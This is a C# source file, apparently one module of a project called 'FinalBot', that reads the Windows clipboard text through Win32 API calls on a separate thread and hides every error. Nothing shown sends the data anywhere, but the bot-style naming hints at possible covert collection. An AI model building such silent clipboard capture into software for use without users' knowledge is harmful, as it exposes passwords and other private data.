using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace FinalBot.Modules
{
    public static class ClipboardModule
    {
        [DllImport("user32.dll")] static extern bool OpenClipboard(IntPtr hWnd);
        [DllImport("user32.dll")] static extern bool CloseClipboard();
        [DllImport("user32.dll")] static extern IntPtr GetClipboardData(uint uFormat);
        [DllImport("kernel32.dll")] static extern IntPtr GlobalLock(IntPtr hMem);
        [DllImport("kernel32.dll")] static extern bool GlobalUnlock(IntPtr hMem);

        private const uint CF_UNICODETEXT = 13;

        public static string GetClipboardText()
        {
            try
            {
                string result = "";
                // Must run on STA thread for clipboard access
                var t = new Thread(() =>
                {
                    try
                    {
                        if (!OpenClipboard(IntPtr.Zero)) return;
                        IntPtr handle = GetClipboardData(CF_UNICODETEXT);
                        if (handle == IntPtr.Zero) { CloseClipboard(); return; }
                        IntPtr ptr = GlobalLock(handle);
                        if (ptr != IntPtr.Zero)
                        {
                            result = Marshal.PtrToStringUni(ptr) ?? "";
                            GlobalUnlock(handle);
                        }
                        CloseClipboard();
                    }
                    catch { }
                });
                t.SetApartmentState(ApartmentState.STA);
                t.Start();
                t.Join();
                return result;
            }
            catch
            {
                return "";
            }
        }
    }
}
